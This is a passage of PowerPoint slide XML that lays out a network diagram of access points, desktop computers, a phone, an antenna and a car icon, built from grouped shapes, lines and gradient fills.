                <a:ext cx="487800" cy="13464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32" name="Group 119"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7084440" y="3722400"/>
                <a:ext cx="275760" cy="63360"/>
                <a:chOff x="7084440" y="3722400"/>
                <a:chExt cx="275760" cy="63360"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="333" name="CustomShape 120"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7084440" y="3722400"/>
                  <a:ext cx="27576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4" name="CustomShape 121"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7097040" y="3722400"/>
                  <a:ext cx="25092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35" name="Line 122"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6988320" y="3751200"/>
                <a:ext cx="0" cy="9072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6" name="Line 123"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7474680" y="3755160"/>
                <a:ext cx="0" cy="8496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37" name="Group 124"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="7297560" y="3967200"/>
              <a:ext cx="491760" cy="205920"/>
              <a:chOff x="7297560" y="3967200"/>
              <a:chExt cx="491760" cy="205920"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="338" name="CustomShape 125"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7299720" y="4057920"/>
                <a:ext cx="487800" cy="1152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9" name="CustomShape 126"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7299720" y="4046400"/>
                <a:ext cx="489600" cy="7092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0" name="CustomShape 127"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7297560" y="3967200"/>
                <a:ext cx="487800" cy="13464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41" name="Group 128"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7395840" y="4001760"/>
                <a:ext cx="275760" cy="63360"/>
                <a:chOff x="7395840" y="4001760"/>
                <a:chExt cx="275760" cy="63360"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="342" name="CustomShape 129"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7395840" y="4001760"/>
                  <a:ext cx="27576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3" name="CustomShape 130"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7408080" y="4001760"/>
                  <a:ext cx="250920" cy="6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44" name="Line 131"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7299720" y="4030560"/>
                <a:ext cx="0" cy="9072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5" name="Line 132"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7785720" y="4034520"/>
                <a:ext cx="0" cy="8496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46" name="Group 133"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="7491240" y="4862520"/>
              <a:ext cx="622440" cy="244080"/>
              <a:chOff x="7491240" y="4862520"/>
              <a:chExt cx="622440" cy="244080"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="347" name="CustomShape 134"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7494120" y="4969800"/>
                <a:ext cx="617040" cy="1368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8" name="CustomShape 135"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7494120" y="4956120"/>
                <a:ext cx="619560" cy="8424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9" name="CustomShape 136"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7491240" y="4862520"/>
                <a:ext cx="617040" cy="15948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50" name="Group 137"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7615440" y="4903560"/>
                <a:ext cx="348840" cy="74880"/>
                <a:chOff x="7615440" y="4903560"/>
                <a:chExt cx="348840" cy="74880"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="351" name="CustomShape 138"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7615440" y="4903560"/>
                  <a:ext cx="34884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52" name="CustomShape 139"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7631280" y="4903560"/>
                  <a:ext cx="31716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53" name="Line 140"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7493760" y="4937760"/>
                <a:ext cx="0" cy="1072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4" name="Line 141"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8108640" y="4942440"/>
                <a:ext cx="0" cy="1072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55" name="Group 142"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="6865920" y="4564080"/>
              <a:ext cx="622080" cy="244080"/>
              <a:chOff x="6865920" y="4564080"/>
              <a:chExt cx="622080" cy="244080"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="356" name="CustomShape 143"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6868440" y="4671360"/>
                <a:ext cx="617040" cy="1368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7" name="CustomShape 144"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6868440" y="4657680"/>
                <a:ext cx="619560" cy="8424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8" name="CustomShape 145"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6865920" y="4564080"/>
                <a:ext cx="617040" cy="15948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59" name="Group 146"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="6989760" y="4605120"/>
                <a:ext cx="348840" cy="74880"/>
                <a:chOff x="6989760" y="4605120"/>
                <a:chExt cx="348840" cy="74880"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="360" name="CustomShape 147"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6989760" y="4605120"/>
                  <a:ext cx="34884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1" name="CustomShape 148"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7005600" y="4605120"/>
                  <a:ext cx="31716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62" name="Line 149"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6868440" y="4639320"/>
                <a:ext cx="0" cy="1072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3" name="Line 150"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7482960" y="4644000"/>
                <a:ext cx="0" cy="1072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64" name="Group 151"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="6141960" y="4906800"/>
              <a:ext cx="622080" cy="244440"/>
              <a:chOff x="6141960" y="4906800"/>
              <a:chExt cx="622080" cy="244440"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="365" name="CustomShape 152"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6144480" y="5014440"/>
                <a:ext cx="617040" cy="13680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6" name="CustomShape 153"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6144480" y="5000760"/>
                <a:ext cx="619560" cy="8424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7" name="CustomShape 154"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6141960" y="4906800"/>
                <a:ext cx="617040" cy="15948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68" name="Group 155"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="6266160" y="4948200"/>
                <a:ext cx="348840" cy="74880"/>
                <a:chOff x="6266160" y="4948200"/>
                <a:chExt cx="348840" cy="74880"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="369" name="CustomShape 156"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6266160" y="4948200"/>
                  <a:ext cx="34884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0" name="CustomShape 157"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6281640" y="4948200"/>
                  <a:ext cx="317160" cy="74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71" name="Line 158"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6144480" y="4982040"/>
                <a:ext cx="0" cy="10764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72" name="Line 159"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6759000" y="4986720"/>
                <a:ext cx="0" cy="10728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73" name="Group 160"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5951520" y="3700440"/>
              <a:ext cx="389880" cy="171000"/>
              <a:chOff x="5951520" y="3700440"/>
              <a:chExt cx="389880" cy="171000"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="374" name="CustomShape 161"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5952960" y="3775680"/>
                <a:ext cx="387000" cy="957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75" name="CustomShape 162"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5952960" y="3766320"/>
                <a:ext cx="388440" cy="59040"/>
              </a:xfrm>
              <a:prstGeom prst="rect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76" name="CustomShape 163"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5951520" y="3700440"/>
                <a:ext cx="387000" cy="111960"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:gradFill rotWithShape="0">
                <a:gsLst>
                  <a:gs pos="0">
                    <a:srgbClr val="800080"/>
                  </a:gs>
                  <a:gs pos="100000">
                    <a:srgbClr val="EAEAEA"/>
                  </a:gs>
                </a:gsLst>
                <a:lin ang="0"/>
              </a:gradFill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77" name="Group 164"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="6029280" y="3729240"/>
                <a:ext cx="218880" cy="52560"/>
                <a:chOff x="6029280" y="3729240"/>
                <a:chExt cx="218880" cy="52560"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="378" name="CustomShape 165"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6029280" y="3729240"/>
                  <a:ext cx="218880" cy="5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9" name="CustomShape 166"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6039360" y="3729240"/>
                  <a:ext cx="199080" cy="5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0">
                  <a:gsLst>
                    <a:gs pos="0">
                      <a:srgbClr val="800080"/>
                    </a:gs>
                    <a:gs pos="100000">
                      <a:srgbClr val="EAEAEA"/>
                    </a:gs>
                  </a:gsLst>
                  <a:lin ang="0"/>
                </a:gradFill>
                <a:ln w="1260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380" name="Line 167"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5952960" y="3753000"/>
                <a:ext cx="0" cy="8676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81" name="Line 168"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6338880" y="3756240"/>
                <a:ext cx="0" cy="86760"/>
              </a:xfrm>
              <a:prstGeom prst="line">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="9360">
                <a:solidFill>
                  <a:schemeClr val="bg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82" name="Group 169"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="7061040" y="5060880"/>
              <a:ext cx="446040" cy="421920"/>
              <a:chOff x="7061040" y="5060880"/>
              <a:chExt cx="446040" cy="421920"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="383" name="Group 170"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7131240" y="5060880"/>
                <a:ext cx="375840" cy="109800"/>
                <a:chOff x="7131240" y="5060880"/>
                <a:chExt cx="375840" cy="109800"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="384" name="CustomShape 171"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7232400" y="5081040"/>
                  <a:ext cx="66600" cy="6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5" name="CustomShape 172"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7346880" y="5079960"/>
                  <a:ext cx="45360" cy="4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6" name="CustomShape 173"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7188480" y="5068800"/>
                  <a:ext cx="110520" cy="9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7" name="CustomShape 174"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7345080" y="5065560"/>
                  <a:ext cx="95760" cy="65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8" name="CustomShape 175"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7147800" y="5096520"/>
                  <a:ext cx="38520" cy="6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9" name="CustomShape 176"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7422840" y="5060880"/>
                  <a:ext cx="84240" cy="8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0" name="CustomShape 177"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7213680" y="5084280"/>
                  <a:ext cx="66600" cy="6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1" name="CustomShape 178"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7328520" y="5084280"/>
                  <a:ext cx="45360" cy="4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2" name="CustomShape 179"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7170120" y="5073120"/>
                  <a:ext cx="108360" cy="97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3" name="CustomShape 180"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7324560" y="5069880"/>
                  <a:ext cx="95760" cy="65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4" name="CustomShape 181"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7131240" y="5106600"/>
                  <a:ext cx="38520" cy="59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5" name="CustomShape 182"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7404120" y="5065560"/>
                  <a:ext cx="84240" cy="80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pic>
            <p:nvPicPr>
              <p:cNvPr id="396" name="Picture 1078" descr="access_point_stylized_gray_small"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="7061040" y="5095440"/>
                <a:ext cx="417600" cy="38736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397" name="Group 183"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5538960" y="3565440"/>
              <a:ext cx="398160" cy="358560"/>
              <a:chOff x="5538960" y="3565440"/>
              <a:chExt cx="398160" cy="358560"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="398" name="Group 184"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="5601240" y="3565440"/>
                <a:ext cx="335880" cy="93240"/>
                <a:chOff x="5601240" y="3565440"/>
                <a:chExt cx="335880" cy="93240"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="399" name="CustomShape 185"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5691600" y="3582360"/>
                  <a:ext cx="59400" cy="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0" name="CustomShape 186"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5793840" y="3581640"/>
                  <a:ext cx="4032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1" name="CustomShape 187"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5652360" y="3572280"/>
                  <a:ext cx="98640" cy="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2" name="CustomShape 188"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5792400" y="3569400"/>
                  <a:ext cx="85680" cy="55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3" name="CustomShape 189"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5616000" y="3595680"/>
                  <a:ext cx="34200" cy="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4" name="CustomShape 190"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5861880" y="3565440"/>
                  <a:ext cx="75240" cy="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5" name="CustomShape 191"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5675040" y="3585240"/>
                  <a:ext cx="59400" cy="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6" name="CustomShape 192"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5777640" y="3585240"/>
                  <a:ext cx="40320" cy="3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7" name="CustomShape 193"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5636160" y="3575880"/>
                  <a:ext cx="96840" cy="8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8" name="CustomShape 194"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5774040" y="3573000"/>
                  <a:ext cx="85680" cy="55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9" name="CustomShape 195"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5601240" y="3604320"/>
                  <a:ext cx="34200" cy="5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0" name="CustomShape 196"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5845320" y="3569400"/>
                  <a:ext cx="75240" cy="6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360">
                  <a:solidFill>
                    <a:schemeClr val="bg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pic>
            <p:nvPicPr>
              <p:cNvPr id="411" name="Picture 1093" descr="access_point_stylized_gray_small"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5538960" y="3594960"/>
                <a:ext cx="372960" cy="329040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412" name="Line 197"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7850160" y="5537160"/>
              <a:ext cx="85680" cy="2880"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="12600">
              <a:solidFill>
                <a:schemeClr val="bg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413" name="Group 198"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5675760" y="4589640"/>
              <a:ext cx="414000" cy="372600"/>
              <a:chOff x="5675760" y="4589640"/>
              <a:chExt cx="414000" cy="372600"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="414" name="Picture 1096" descr="desktop_computer_stylized_medium"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId6"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="5675760" y="4589640"/>
                <a:ext cx="414000" cy="3726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15" name="CustomShape 199"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="5852160" y="4625280"/>
                <a:ext cx="195120" cy="17064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16" name="Group 200"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5357880" y="5010120"/>
              <a:ext cx="482400" cy="406080"/>
              <a:chOff x="5357880" y="5010120"/>
              <a:chExt cx="482400" cy="406080"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="417" name="Picture 1099" descr="desktop_computer_stylized_medium"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId7"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="5357880" y="5010120"/>
                <a:ext cx="482400" cy="40608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18" name="CustomShape 201"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="5563080" y="5049000"/>
                <a:ext cx="22716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19" name="Group 202"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5835960" y="5311800"/>
              <a:ext cx="426600" cy="348840"/>
              <a:chOff x="5835960" y="5311800"/>
              <a:chExt cx="426600" cy="348840"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="420" name="Picture 1102" descr="desktop_computer_stylized_medium"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId8"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="5835960" y="5311800"/>
                <a:ext cx="426600" cy="34884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21" name="CustomShape 203"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="6017760" y="5345280"/>
                <a:ext cx="200880" cy="15984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22" name="Group 204"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="6450120" y="5294160"/>
              <a:ext cx="426600" cy="350640"/>
              <a:chOff x="6450120" y="5294160"/>
              <a:chExt cx="426600" cy="350640"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="423" name="Picture 1105" descr="desktop_computer_stylized_medium"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId8"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="6450120" y="5294160"/>
                <a:ext cx="426600" cy="35064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24" name="CustomShape 205"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6493680" y="5328000"/>
                <a:ext cx="200880" cy="16056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425" name="Picture 1107" descr="car_icon_small"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId9"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="6242040" y="1776240"/>
              <a:ext cx="848880" cy="167760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426" name="Group 206"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5513400" y="1601640"/>
              <a:ext cx="415440" cy="385560"/>
              <a:chOff x="5513400" y="1601640"/>
              <a:chExt cx="415440" cy="385560"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="427" name="Picture 1109" descr="iphone_stylized_small"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId10"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5672880" y="1659240"/>
                <a:ext cx="136440" cy="3279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28" name="Picture 1110" descr="antenna_radiation_stylized"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId11"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5513400" y="1601640"/>
                <a:ext cx="415440" cy="88560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429" name="Group 207"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="8140680" y="5057640"/>
              <a:ext cx="226800" cy="480960"/>
              <a:chOff x="8140680" y="5057640"/>
              <a:chExt cx="226800" cy="480960"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="430" name="CustomShape 208"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8320320" y="5058720"/>
                <a:ext cx="44640" cy="4586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1" name="CustomShape 209"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8151840" y="5057640"/>
                <a:ext cx="166320" cy="4582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2" name="CustomShape 210"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8328960" y="5086080"/>
                <a:ext cx="26640" cy="424080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3" name="CustomShape 211"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8322840" y="5301000"/>
                <a:ext cx="4140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4" name="CustomShape 212"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8151840" y="511020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35" name="Group 213"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="8237520" y="5105160"/>
                <a:ext cx="91800" cy="29880"/>
                <a:chOff x="8237520" y="5105160"/>
                <a:chExt cx="91800" cy="29880"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="436" name="CustomShape 214"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="8237520" y="5105160"/>
                  <a:ext cx="91800" cy="298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37" name="CustomShape 215"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
